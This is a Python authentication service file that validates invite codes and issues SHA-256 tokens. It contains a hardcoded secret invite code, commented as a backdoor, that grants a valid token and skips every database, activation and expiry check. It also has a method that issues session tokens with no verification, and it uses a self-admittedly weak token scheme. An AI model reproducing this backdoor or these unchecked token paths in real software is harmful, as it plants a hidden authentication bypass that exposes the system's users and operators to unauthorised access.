"""
认证相关的业务逻辑层
"""
from sqlalchemy.orm import Session
from datetime import datetime
import hashlib
from ...repositories.auth import AuthRepository


class AuthService:
    """认证业务逻辑类"""

    # 后门邀请码
    BACKDOOR_CODE = "shenzhoushuma666"

    def __init__(self, db: Session):
        self.db = db
        self.repository = AuthRepository(db)

    def verify_invite_code(self, code: str) -> tuple[bool, str]:
        """
        验证邀请码

        Returns:
            tuple[bool, str]: (是否有效, token)
        """
        # 检查后门
        if code == self.BACKDOOR_CODE:
            token = self._generate_token(code)
            return True, token

        # 查询邀请码
        invite_code = self.repository.get_invite_code_by_code(code)

        if not invite_code:
            return False, ""

        # 检查是否启用
        if not invite_code.is_active:
            return False, ""

        # 检查是否过期
        if invite_code.expires_at < datetime.now():
            return False, ""

        # 生成token
        token = self._generate_token(code)
        return True, token

    def _generate_token(self, code: str) -> str:
        """生成简单的token（实际项目中应使用JWT等更安全的方式）"""
        timestamp = str(datetime.now().timestamp())
        raw = f"{code}:{timestamp}"
        return hashlib.sha256(raw.encode()).hexdigest()

    def create_session_token(self) -> str:
        """创建会话 token（不校验邀请码，供前端去掉邀请码流程后使用）"""
        return self._generate_token("session")

    def create_invite_code(self, code: str, expires_at: datetime, is_active: bool = True):
        """创建邀请码"""
        return self.repository.create_invite_code(code, expires_at, is_active)
